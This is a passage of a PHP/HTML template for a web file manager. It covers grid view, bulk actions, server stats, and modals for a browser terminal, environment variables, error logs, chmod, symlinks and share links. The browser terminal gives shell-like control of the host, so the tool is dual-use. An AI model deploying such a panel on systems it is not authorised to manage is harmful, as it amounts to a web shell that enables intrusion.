          <?php if(empty($list['folders'])&&empty($list['files'])):?>
          <tr><td colspan="6"><div class="empty"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><p><?=isset($_GET['q'])&&$_GET['q']!==''?'No matches.':'This folder is empty.'?></p></div></td></tr>
          <?php endif;?>
          </tbody>
        </table>
      </div>
    </div>
    </div><!-- #lvw -->

    <!-- GRID VIEW -->
    <div id="gvw" style="display:none">
      <div class="gv">
        <?php foreach(array_merge($list['folders'],$list['files']) as $item):
          $isDir=is_dir($fm->getCwd().'/'.$item['name']);
          $type=$isDir?'folder':$item['type'];$color=$isDir?'#818cf8':$fm->getColor($type);
          $rawUrl='?raw='.urlencode($item['name']).'&dir='.urlencode($fm->getCwd());
          $prev=!$isDir&&$fm->canPreview($type);
        ?>
        <div class="gi" data-name="<?=he($item['name'])?>" data-isdir="<?=$isDir?1:0?>"
          <?php if(!$isDir&&$prev):?>data-preview="<?=he($rawUrl)?>" data-type="<?=$type?>" data-fname="<?=he($item['name'])?>"
          <?php elseif($isDir):?>onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$item['name'])?>'"<?php endif;?>
          data-ctx-name="<?=he($item['name'])?>" data-ctx-isdir="<?=$isDir?1:0?>" data-ctx-raw="<?=$isDir?'':he($rawUrl)?>">
          <input type="checkbox" class="rck item-ck gi-ck" value="<?=he($item['name'])?>" onclick="event.stopPropagation()">
          <div class="gi-ic" style="background:<?=$color?>18">
            <?php if(!$isDir&&$type==='image'):?><img src="<?=$rawUrl?>" class="gi-th" loading="lazy" onerror="this.style.display='none'"><?php elseif($isDir):?><?=svgFolder()?><?php else:?><?=svgFile($type)?><?php endif;?>
          </div>
          <div class="gi-n"><?=htmlspecialchars($item['name'])?></div>
          <div class="gi-m"><?=$isDir?'DIR':fmtSz($item['size'])?></div>
        </div>
        <?php endforeach;if(empty($list['folders'])&&empty($list['files'])):?><div class="empty" style="grid-column:1/-1"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><p>Empty.</p></div><?php endif;?>
      </div>
    </div>

    <!-- BULK BAR -->
    <div class="bulk-bar" id="bulkBar">
      <span class="bkc" id="bulkCount">0</span>
      <button type="button" class="btn btn-xs btn-g" id="bkZip"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/></svg>ZIP</button>
      <button type="button" class="btn btn-xs btn-g" id="bkTar"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>TAR.GZ</button>
      <button type="button" class="btn btn-xs btn-blue" id="bkCopy"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>
      <button type="button" class="btn btn-xs btn-amb" id="bkMove"><svg viewBox="0 0 24 24"><polyline points="16 3 21 3 21 8"/><line x1="21" y1="3" x2="14" y2="10"/><path d="M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5"/></svg>Move</button>
      <button type="button" class="btn btn-xs btn-red" id="bkDel"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Delete</button>
    </div>
    <?php endif;?>
  </div><!-- .content -->
</main>

<!-- STATUS BAR -->
<?php $ss=$fm->sysStats();?>
<footer class="bar">
  <div class="bs"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><strong><?=$totalFolders?></strong>&nbsp;folders</div>
  <div class="bs"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg><strong><?=$totalFiles?></strong>&nbsp;files</div>
  <?php if($totalSize>0):?><div class="bs"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg><strong><?=fmtSz($totalSize)?></strong></div><?php endif;?>
  <div class="bs bs-click" id="sbDisk" title="Disk usage — click for server details"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg><strong id="sbDiskV"><?=$ss['disk_pct']?>%</strong>&nbsp;disk</div>
  <?php if($ss['load']):?>
  <div class="bs bs-click" id="sbLoad" title="CPU load average (1m / 5m / 15m) — click for server details"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg><strong id="sbLoadV"><?=implode(' ',$ss['load'])?></strong></div>
  <?php endif;?>
  <?php if($ss['mem_total']>0):?>
  <div class="bs bs-click" id="sbMem" title="RAM usage — click for server details"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="15" x2="23" y2="15"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="15" x2="4" y2="15"/></svg><strong id="sbMemV"><?=$ss['mem_pct']?>%</strong>&nbsp;ram</div>
  <?php endif;?>
  <?php if($ss['uptime']>0):?>
  <div class="bs bs-click" title="Server uptime — click for server details"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="sbUptimeV"><?=fmtUptime($ss['uptime'])?></strong></div>
  <?php endif;?>
  <div class="br">
    <div class="bs" id="selStat" style="display:none"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg><strong id="selCount">0</strong>&nbsp;selected</div>
    <div class="bs bs-click" title="Server info"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>PHP&nbsp;<strong><?=PHP_VERSION?></strong></div>
    <div class="bs"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="clockEl"><?=date('H:i:s')?></strong></div>
  </div>
</footer>
</div><!-- .shell -->

<!-- HIDDEN FORM -->
<form id="af" method="post" style="display:none">
  <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
  <input type="hidden" name="action" id="af_a"><input type="hidden" name="item_name" id="af_n">
  <input type="hidden" name="old_name" id="af_o"><input type="hidden" name="new_name" id="af_nw">
  <input type="hidden" name="items" id="af_items"><input type="hidden" name="target" id="af_tgt">
  <input type="hidden" name="trash_id" id="af_tr">
</form>

<!-- CONTEXT MENU (desktop) -->
<div class="ctx" id="ctx">
  <div class="ctx-header"><svg viewBox="0 0 24 24" fill="none" stroke="var(--t3)" stroke-width="1.8" stroke-linecap="round" style="width:14px;height:14px;flex-shrink:0"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg><span id="ctx-name"></span></div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-open"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Open</div>
  <div class="ctx-item" id="ctx-edit"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>Edit</div>
  <div class="ctx-item" id="ctx-dl"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</div>
  <div class="ctx-item" id="ctx-prev"><svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Preview</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-path"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy Path</div>
  <div class="ctx-item" id="ctx-hash"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Checksum</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-dup"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Duplicate</div>
  <div class="ctx-item" id="ctx-share"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>Share Link</div>
  <div class="ctx-item" id="ctx-dirsize"><svg viewBox="0 0 24 24"><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>Calculate Size</div>
  <div class="ctx-item" id="ctx-perm"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Permissions</div>
  <div class="ctx-item" id="ctx-ren"><svg viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/></svg>Rename</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item danger" id="ctx-del"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Delete</div>
</div>

<!-- MOBILE BOTTOM SHEET -->
<div class="sheet-ov" id="shOv"></div>
<div class="sheet" id="sheet">
  <div class="sheet-handle"></div>
  <div class="sheet-info">
    <div class="sheet-name" id="sh-name"></div>
    <div class="sheet-meta" id="sh-meta"></div>
  </div>
  <div class="sheet-grid" id="sh-grid"></div>
  <div style="height:8px"></div>
</div>

<!-- PREVIEW MODAL -->
<div class="prev-ov" id="prevOv">
  <div class="prev-box">
    <div class="prev-head">
      <span id="prevName"></span>
      <a id="prevDl" class="btn btn-xs btn-g" href="#" download style="margin-left:auto;margin-right:6px"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</a>
      <button type="button" class="btn btn-icon btn-g" id="prevClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="prev-body" id="prevBody"></div>
  </div>
</div>

<!-- TERMINAL MODAL -->
<?php if(!$fm->isRO()):?>
<div class="mod-ov" id="termOv">
  <div class="mod mod-lg">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
      <span class="mod-title">Terminal — <?=htmlspecialchars($fm->getCwd())?></span>
      <button class="btn btn-icon btn-g" id="termClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" style="padding:14px;background:var(--surf)">
      <div class="term-win" id="termWin">
        <div class="term-titlebar">
          <div class="term-dots"><div class="term-dot r" id="td-r" title="Close" style="cursor:pointer"></div><div class="term-dot y" title="Minimize"></div><div class="term-dot g" title="Maximize"></div></div>
          <div class="term-title">bash — <?=htmlspecialchars(basename($fm->getCwd()))?></div>
          <button class="btn btn-xs btn-g" id="termClear" style="padding:2px 8px;font-size:10px">clear</button>
        </div>
        <div class="term-out" id="termOut">
          <span class="term-line info-line">Welcome to File Manager Terminal</span>
          <span class="term-line info-line">Working dir: <?=htmlspecialchars($fm->getCwd())?></span>
          <span class="term-line info-line">─────────────────────────────────────────</span>
        </div>
        <div style="position:relative">
          <div class="term-row">
            <span class="term-ps">
              <span class="term-prompt-str"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span><span class="term-at">@</span><span class="term-path"><?=htmlspecialchars(gethostname()?:'server')?></span><span class="term-dollar">:<?=htmlspecialchars(basename($fm->getCwd()))?>$</span>
            </span>
            <input class="term-inp" id="termInp" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" placeholder="Type a command…">
          </div>
          <div class="term-suggest" id="termSug" style="display:none;bottom:100%;left:14px;position:absolute"></div>
        </div>
      </div>
    </div>
  </div>
</div>
<?php endif;?>

<!-- CHECKSUM MODAL -->
<div class="mod-ov" id="hashOv">
  <div class="mod mod-md">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="mod-title" id="hashTitle">Checksum</span><button class="btn btn-icon btn-g" id="hashClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" id="hashBody"><div style="text-align:center;padding:32px;color:var(--t3)">Computing…</div></div>
  </div>
</div>

<!-- ACTIVITY LOG MODAL -->
<div class="mod-ov" id="actOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div><span class="mod-title">Activity Log</span>
      <?php if(!$fm->isRO()):?><form method="post" style="margin-right:8px"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="clear_log"><button class="btn btn-xs btn-red" onclick="return confirm('Clear all?')">Clear</button></form><?php endif;?>
      <button class="btn btn-icon btn-g" id="actClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" style="padding:0" id="actBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- SERVER INFO MODAL -->
<div class="mod-ov" id="srvOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg></div><span class="mod-title">Server Information</span><button class="btn btn-icon btn-g" id="srvClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" id="srvBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- LARGE FILES MODAL -->
<div class="mod-ov" id="largeOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg></div><span class="mod-title">Large Files</span>
      <select id="largeMb" class="inp" style="width:auto;margin-right:8px;padding:6px 10px;font-size:12px">
        <option value="10">&gt; 10 MB</option><option value="50" selected>&gt; 50 MB</option><option value="100">&gt; 100 MB</option><option value="500">&gt; 500 MB</option><option value="1024">&gt; 1 GB</option>
      </select>
      <button class="btn btn-icon btn-g" id="largeClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" style="padding:0" id="largeBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- DUPLICATE FINDER MODAL -->
<div class="mod-ov" id="dupOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></div><span class="mod-title">Duplicate Files</span><button class="btn btn-icon btn-g" id="dupClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="dupBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- SPEED TEST MODAL -->
<div class="mod-ov" id="speedOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div><span class="mod-title">Network Speed Test</span><button class="btn btn-icon btn-g" id="speedClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <div class="info-g" style="grid-template-columns:1fr 1fr 1fr">
        <div class="info-c"><div class="info-cl">Ping</div><div class="info-cv" id="spPing">—</div></div>
        <div class="info-c"><div class="info-cl">Download</div><div class="info-cv" id="spDown">—</div></div>
        <div class="info-c"><div class="info-cl">Upload</div><div class="info-cv" id="spUp">—</div></div>
      </div>
      <button type="button" id="spRun" class="btn btn-p" style="width:100%;margin-top:6px"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Run Test</button>
      <div id="spStatus" style="text-align:center;font-size:11.5px;color:var(--t3);margin-top:8px"></div>
    </div>
  </div>
</div>

<?php if(!empty($_SESSION['fm_admin'])):?>
<!-- ERROR LOG MODAL -->
<div class="mod-ov" id="errLogOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><span class="mod-title">PHP Error Log</span>
      <?php if(!$fm->isRO()):?><form method="post" style="margin-right:8px"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="clear_errlog"><button class="btn btn-xs btn-red" onclick="return confirm('Clear the error log?')">Clear</button></form><?php endif;?>
      <button class="btn btn-icon btn-g" id="errLogClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" id="errLogBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- ENVIRONMENT VARIABLES MODAL -->
<div class="mod-ov" id="envOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">Environment Variables</span><button class="btn btn-icon btn-g" id="envClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="envBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>
<?php endif;?>

<!-- BATCH RENAME MODAL -->
<?php if(!$fm->isRO()):?>
<div class="mod-ov" id="brOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></div><span class="mod-title">Batch Rename</span><button class="btn btn-icon btn-g" id="brClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" id="brForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="batch_rename">
        <input type="hidden" name="items" id="brItems">
        <p style="color:var(--t2);font-size:12.5px;margin-bottom:14px">Select files first, then rename with one of these modes:</p>
        <div style="display:flex;flex-direction:column;gap:10px">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="radio" name="br_mode" value="replace" checked> <span style="font-size:13px">Find &amp; Replace</span>
          </label>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <input type="text" name="br_find" class="inp" placeholder="Find…">
            <input type="text" name="br_replace" class="inp" placeholder="Replace with…">
          </div>
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="radio" name="br_mode" value="prefix"> <span style="font-size:13px">Add Prefix</span>
          </label>
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="radio" name="br_mode" value="suffix"> <span style="font-size:13px">Add Suffix (before extension)</span>
          </label>
          <button type="submit" class="btn btn-p" style="margin-top:4px"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>Rename selected files</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- SYMLINK MODAL -->
<div class="mod-ov" id="symlinkOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div><span class="mod-title">Create Symlink</span><button class="btn btn-icon btn-g" id="symlinkClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" style="display:flex;flex-direction:column;gap:10px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_symlink">
        <div><label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px">Target path (can be relative or absolute)</label><input type="text" name="sym_target" class="inp" style="width:100%" placeholder="/path/to/target" required></div>
        <div><label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px">Link name (in current folder)</label><input type="text" name="sym_name" class="inp" style="width:100%" placeholder="link-name" required></div>
        <button type="submit" class="btn btn-p"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/></svg>Create Symlink</button>
      </form>
    </div>
  </div>
</div>

<!-- PERMISSIONS MODAL -->
<div class="mod-ov" id="permOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div><span class="mod-title" id="permTitle">Permissions</span><button class="btn btn-icon btn-g" id="permClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" id="permForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="chmod_item">
        <input type="hidden" name="item_name" id="permName">
        <table class="perm-t" style="width:100%;margin-bottom:12px">
          <thead><tr><th></th><th>Read</th><th>Write</th><th>Execute</th></tr></thead>
          <tbody>
            <tr><td>Owner</td><td><input type="checkbox" class="rck perm-ck" data-bit="256"></td><td><input type="checkbox" class="rck perm-ck" data-bit="128"></td><td><input type="checkbox" class="rck perm-ck" data-bit="64"></td></tr>
            <tr><td>Group</td><td><input type="checkbox" class="rck perm-ck" data-bit="32"></td><td><input type="checkbox" class="rck perm-ck" data-bit="16"></td><td><input type="checkbox" class="rck perm-ck" data-bit="8"></td></tr>
            <tr><td>Others</td><td><input type="checkbox" class="rck perm-ck" data-bit="4"></td><td><input type="checkbox" class="rck perm-ck" data-bit="2"></td><td><input type="checkbox" class="rck perm-ck" data-bit="1"></td></tr>
          </tbody>
        </table>
        <div style="display:flex;align-items:center;gap:10px">
          <label style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px">Octal</label>
          <input type="text" id="permOctal" name="perm" class="inp mono" style="width:80px;text-align:center" maxlength="4" pattern="[0-7]{3,4}" required>
          <button type="submit" class="btn btn-p" style="margin-left:auto"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Apply</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CREATE SHARE LINK MODAL -->
<div class="mod-ov" id="shareCreateOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></div><span class="mod-title" id="shareCreateTitle">Share Link</span><button class="btn btn-icon btn-g" id="shareCreateClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" style="display:flex;flex-direction:column;gap:12px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_share">
        <input type="hidden" name="item_name" id="shareItemName">
        <div>
          <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:8px">Link expires after</label>
          <select name="share_dur" class="inp" style="width:100%">
            <option value="1h">1 hour</option>
            <option value="1d" selected>1 day</option>
            <option value="7d">7 days</option>
            <option value="30d">30 days</option>
            <option value="never">Never</option>
          </select>
        </div>
        <button type="submit" class="btn btn-p"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg>Create Link</button>
      </form>
    </div>
  </div>
</div>

<!-- MANAGE SHARE LINKS MODAL -->
<div class="mod-ov" id="sharesOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg></div><span class="mod-title">Share Links</span><button class="btn btn-icon btn-g" id="sharesClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0">
      <?php $allShares=$fm->getShares();if(!$allShares):?>
      <div class="empty" style="padding:40px"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg><p>No share links yet. Right-click a file and choose "Share Link".</p></div>
      <?php else: foreach($allShares as $sh):
        $expired=!empty($sh['expires'])&&$sh['expires']<time();
        $shareUrl=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']?'https://':'http://').$_SERVER['HTTP_HOST'].strtok($_SERVER['REQUEST_URI'],'?').'?share='.$sh['token'];
      ?>
      <div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap;<?=$expired?'opacity:.5':''?>">
        <div style="flex:1;min-width:180px">
          <div style="font-size:13px;font-weight:600;color:var(--t1)"><?=htmlspecialchars($sh['name'])?></div>
